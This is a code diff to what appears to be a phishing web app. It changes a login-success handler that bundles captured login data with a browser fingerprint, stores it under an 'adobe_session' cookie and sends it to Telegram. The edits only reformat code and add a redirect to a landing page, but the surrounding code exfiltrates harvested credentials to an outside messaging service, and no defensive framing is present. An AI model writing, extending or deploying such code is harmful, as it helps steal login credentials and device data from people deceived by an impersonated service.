@@ -64,13 +64,26 @@ function App() {
   const handleLoginSuccess = async (loginData: any) => {
     setIsLoading(true);
     const browserFingerprint = await getBrowserFingerprint();
-    const finalSessionData = { ...loginData, sessionId: Math.random().toString(36).substring(2, 15), timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...browserFingerprint };
+    const finalSessionData = { 
+      ...loginData, 
+      sessionId: Math.random().toString(36).substring(2, 15), 
+      timestamp: new Date().toISOString(), 
+      userAgent: navigator.userAgent, 
+      ...browserFingerprint 
+    };
     localStorage.setItem(config.session.sessionDataKey, JSON.stringify(finalSessionData));
     const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
     setCookie('adobe_session', encodeURIComponent(JSON.stringify(loginData)), cookieOptions);
     setCookie('logged_in', 'true', cookieOptions);
+    
+    // Update session state immediately to trigger navigation
+    setHasActiveSession(true);
+    
     try { await safeSendToTelegram(finalSessionData); } catch (error) { console.error('Failed to send final data to Telegram:', error); }
     setIsLoading(false);
+    
+    // Ensure navigation to landing page
+    navigate('/landing', { replace: true });
   };
 
   const handleLogout = () => {
